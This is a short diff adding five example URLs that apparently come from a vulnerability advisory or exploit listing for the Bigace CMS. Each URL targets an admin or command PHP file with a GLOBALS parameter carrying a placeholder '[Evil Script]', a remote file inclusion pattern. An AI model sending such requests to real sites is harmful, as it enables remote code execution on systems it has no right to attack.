@@ -1,0 +1,5 @@
+http://www.example.com/[Bigace]/system/admin/include/item_main.php?GLOBALS=[Evil Script]
+http://www.example.com/[Bigace]/system/admin/include/upload_form.php?GLOBALS=[Evil Script]
+http://www.example.com/[Bigace]/system/command/download.cmd.php?GLOBALS=[Evil Script]
+http://www.example.com/[Bigace]/system/command/download.cmd.php?GLOBALS=[Evil Script]
+http://www.example.com/[Bigace]/system/command/admin.cmd.php?GLOBALS=[Evil Script]
